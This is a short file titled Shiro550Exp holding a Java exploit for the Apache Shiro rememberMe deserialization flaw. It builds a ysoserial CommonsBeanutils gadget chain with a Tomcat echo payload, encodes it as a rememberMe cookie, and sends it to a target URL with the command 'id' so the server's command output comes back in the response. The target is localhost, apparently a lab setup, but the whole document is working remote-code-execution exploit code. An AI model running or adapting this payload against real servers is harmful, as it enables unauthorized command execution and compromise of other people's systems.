# Shiro550Exp

```java
import myframework.HttpRequest;
import ysoserial.payloads.CommonsBeanutils183;
import ysoserial.payloads.Shiro_550;
import ysoserial.payloads.rceecho.TomcatEcho3;

public class Shiro550Exp {
    public static void main(String[] args) throws Exception{
        String url = "http://localhost:8080/shiro550/";
        Object o = new TomcatEcho3().getObject(CommonsBeanutils183.class);
        String cookie = new Shiro_550().getPayload(o);
        byte[] resp = new HttpRequest(url).addHeader("Cookie","rememberMe=" + cookie).addParam("cmd","id").addHeader("cmd","id").send();
        System.out.println(new String(resp));
    }
}

```
